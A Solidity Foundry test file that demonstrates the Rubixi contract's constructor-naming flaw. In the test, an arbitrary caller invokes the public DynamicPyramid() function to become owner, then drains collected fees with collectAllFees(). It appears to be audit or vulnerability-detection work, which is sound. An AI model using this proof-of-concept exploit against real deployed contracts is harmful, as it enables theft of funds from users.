
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Rubixi} from "../src/Rubixi.sol";

contract TestAccessControlRubixi is Test {
    Rubixi public _contractUnderTest;
    address public originalDeployer;

    function setUp() public {
        originalDeployer = address(this);
        _contractUnderTest = new Rubixi();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // --- 1. Constraints ---
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm));
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Note: We do NOT exclude the original deployer because the vulnerability is that
        // DynamicPyramid() is a public function that ANYONE can call to become the creator.
        // The original deployer deployed the contract, but DynamicPyramid() was never called
        // as a constructor (it's just a regular function due to the naming mismatch with the contract name).

        // --- 2. State Configuration ---
        // Fund the caller so they can collect fees after becoming owner
        vm.deal(caller, 10 ether);
        
        // Fund the contract with some fees by sending less than 1 ether
        // This goes directly to collectedFees
        vm.deal(address(this), 1 ether);
        (bool success,) = address(_contractUnderTest).call{value: 0.5 ether}("");
        require(success, "Failed to send initial fees");

        // --- 3. Execution & Assertion ---
        
        // Switch context to the arbitrary caller
        vm.startPrank(caller);

        // TRIGGER VULNERABILITY: Call DynamicPyramid() to become the creator
        // This function should be a constructor but is instead a public function
        // that anyone can call to set themselves as the creator/owner
        _contractUnderTest.DynamicPyramid();

        // Verify the caller is now the owner by successfully calling an onlyowner function
        // If the caller successfully became the owner, collectAllFees() should work
        uint256 callerBalanceBefore = caller.balance;
        _contractUnderTest.collectAllFees();
        uint256 callerBalanceAfter = caller.balance;

        vm.stopPrank();

        // Assert that the caller received the fees, proving they became the owner
        assertGt(callerBalanceAfter, callerBalanceBefore, "Caller should have received fees as new owner");
    }
}
